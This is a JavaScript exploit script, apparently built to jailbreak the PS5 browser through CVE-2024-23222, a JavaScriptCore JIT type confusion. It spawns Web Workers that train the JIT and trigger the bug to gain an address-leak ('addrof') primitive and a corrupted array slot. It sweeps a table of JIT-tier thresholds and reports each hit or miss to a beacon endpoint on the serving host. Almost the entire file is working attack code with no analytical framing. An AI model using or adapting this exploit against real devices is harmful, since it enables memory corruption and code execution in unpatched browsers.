// p179c — CVE-2024-23222 Worker-based PIVOT sweep for PS5
// Fixes p179/p179b: uses Workers for clean JIT state, preserves
// two-IIFE structure, template-substitutes constants (no extra closure).
// Beacon prefix: V179C-

(function() {
  "use strict";

  var BASE = location.protocol + '//' + location.host;

  function syncB(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V179C-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch(e) {}
  }

  syncB('BOOT');

  // Worker source template — verbatim from the original PoC structure.
  // {{WARMUP}}, {{PIVOT}}, {{GC}} are replaced per-attempt.
  // This preserves the EXACT closure depth the exploit requires.
  var WORKER_TEMPLATE = [
    '"use strict";',
    '',
    'var _log = [];',
    'function print(s) { _log.push(String(s)); }',
    '',
    'var R = 4294967296;',
    'var D = R - 1;',
    'var _f64 = new Float64Array(1);',
    'var _u32 = new Uint32Array(_f64.buffer);',
    'function f2i(d) { _f64[0] = d; return _u32[1] * R + _u32[0]; }',
    'function i2f(i) { _u32[1] = i / R; _u32[0] = i & D; return _f64[0]; }',
    'function hex(i) { return i === null ? "(n/a)" : "0x" + i.toString(16); }',
    '',
    'var WARMUP_TOTAL    = {{WARMUP}};',
    'var STRUCTURE_PIVOT = {{PIVOT}};',
    'var GC_FLUSH_COUNT  = {{GC}};',
    '',
    'var pm = {};',
    'var result = {};',
    '',
    '(function init() {',
    '',
    'pm.phantom = {',
    '    fakeHeader: 1,',
    '    fakeButterfly: 2,',
    '};',
    'pm.trapArray = [1.1, pm.phantom];',
    '',
    'var trainingArray = [1.1, 1.1];',
    'trainingArray.ho = 1.1;',
    'var fallbackArray = [1.1, 2.2];',
    'fallbackArray.ho = 1.1;',
    '',
    'function n() {}',
    'var targetObj    = Reflect.construct(Object, [], n);',
    'var divergentObj = Reflect.construct(Object, [], n);',
    'targetObj.p1 = trainingArray;',
    'targetObj.p2 = trainingArray;',
    'divergentObj.p1 = 0x1337;',
    'divergentObj.p2 = 0x1337;',
    'delete divergentObj.p2;',
    'delete divergentObj.p1;',
    'divergentObj.p1 = 0x1337;',
    'divergentObj.p2 = 0x1337;',
    '',
    'var guardObj = {',
    '    guard_p1: 1,',
    '    p1: [1.1, 2.2],',
    '};',
    '',
    'var lowBits  = new Uint32Array(2);',
    'var asDouble = new Float64Array(lowBits.buffer);',
    '',
    'var trigger = function (useDivergent, earlyExit) {',
    '  if (earlyExit) return;',
    '  var obj = targetObj;',
    '  if (useDivergent) {',
    '    obj = divergentObj;',
    '    0[0];',
    '  }',
    '  var h = 0;',
    // 47 while-loops — FIRST BANK
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '',
    '  "uo" in obj;',
    '  var arr = obj.p1;',
    '  if (useDivergent) arr = fallbackArray;',
    '  asDouble[0] = arr[1];',
    '  lowBits[0] = lowBits[0] + 16;',
    '  arr[1] = asDouble[0];',
    '',
    // 47 while-loops — SECOND BANK
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '  while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;',
    '};',
    '',
    'for (var t = 0; t < WARMUP_TOTAL; t++) {',
    '    if (t > STRUCTURE_PIVOT) {',
    '        trigger(false, true);',
    '        continue;',
    '    }',
    '    trigger(t % 2 && t < 256, t > 4096);',
    '    if (t == STRUCTURE_PIVOT) delete targetObj.p2;',
    '}',
    '',
    'for (var t = 0; t < GC_FLUSH_COUNT; t++) new Array(13.37, 13.37, 13.37, 13.37);',
    '',
    'delete targetObj.p1;',
    'targetObj.p1 = pm.trapArray;',
    'targetObj.p2 = 1;',
    '',
    'trigger(false, false);',
    '',
    'result.lowBits = lowBits;',
    '',
    '})();',
    '',
    'var lowBits = result.lowBits;',
    'var leaked_plus16 = lowBits[1] * R + lowBits[0];',
    'var leaked = leaked_plus16 - 16;',
    'var addrofWon = leaked > 0 && lowBits[1] < 0x10000 && lowBits[1] > 0 && (leaked % 16) === 0;',
    'var fake = pm.trapArray[1];',
    'var slotChanged = (fake !== pm.phantom);',
    'var won = addrofWon && slotChanged;',
    '',
    'if (!won) {',
    '    self.postMessage({',
    '        type: "miss",',
    '        leaked: leaked,',
    '        high32: lowBits[1],',
    '        low32: lowBits[0],',
    '        log: _log.join("\\n")',
    '    });',
    '    throw "race-lost";',
    '}',
    '',
    'self.postMessage({',
    '    type: "hit",',
    '    leaked: leaked,',
    '    high32: lowBits[1],',
    '    log: _log.join("\\n")',
    '});',
  ].join('\n');

  // PIVOT sweep table — wide range covering DFG through FTL
  var PIVOTS = [
    // DFG range
    500, 1000, 2000, 5000, 10000,
    // DFG-FTL gap
    20000, 40000, 60000,
    // FTL range
    80000, 100000, 120000, 140000, 150000, 160000,
    165000, 170000, 173000, 175000, 178000, 180000, 185000,
    190000, 200000, 225000, 250000, 300000
  ];

  var GC = 262144;  // conservative for PS5 memory
  var sweepIndex = 0;
  var hitPivot = null;
  var totalAttempts = 0;

  function hex(i) { return i === null ? "(n/a)" : "0x" + i.toString(16); }

  function runNext() {
    if (sweepIndex >= PIVOTS.length) {
      syncB('SWEEP-DONE-NOHIT');
      return;
    }
    if (hitPivot !== null) {
      return;
    }

    var pivot = PIVOTS[sweepIndex];
    var warmup = pivot < 10000 ? pivot + 5000 : (pivot < 50000 ? pivot + 50000 : pivot + 75000);

    totalAttempts++;
    syncB('TRY-P' + pivot);

    var src = WORKER_TEMPLATE
      .replace('{{WARMUP}}', warmup)
      .replace('{{PIVOT}}', pivot)
      .replace('{{GC}}', GC);

    var blob = new Blob([src], { type: 'text/javascript' });
    var url = URL.createObjectURL(blob);
    var worker;

    try {
      worker = new Worker(url);
    } catch(e) {
      syncB('WORKER-FAIL-' + (e.message || '').substring(0, 30));
      URL.revokeObjectURL(url);
      sweepIndex++;
      setTimeout(runNext, 50);
      return;
    }

    var timeout = setTimeout(function() {
      syncB('TIMEOUT-P' + pivot);
      try { worker.terminate(); } catch(e) {}
      URL.revokeObjectURL(url);
      sweepIndex++;
      setTimeout(runNext, 50);
    }, 10000);

    worker.onmessage = function(e) {
      clearTimeout(timeout);
      var d = e.data;
      URL.revokeObjectURL(url);

      if (d.type === 'hit') {
        hitPivot = pivot;
        syncB('HIT-P' + pivot + '-ADDR-' + hex(d.leaked) + '-H' + hex(d.high32));
        syncB('ADDROF-WON');
      } else {
        syncB('MISS-P' + pivot + '-H' + hex(d.high32) + '-L' + hex(d.low32));
        sweepIndex++;
        setTimeout(runNext, 100);
      }
    };

    worker.onerror = function(e) {
      clearTimeout(timeout);
      URL.revokeObjectURL(url);
      syncB('WERR-P' + pivot + '-' + (e.message || '').substring(0, 40));
      sweepIndex++;
      setTimeout(runNext, 100);
    };
  }

  runNext();
})();
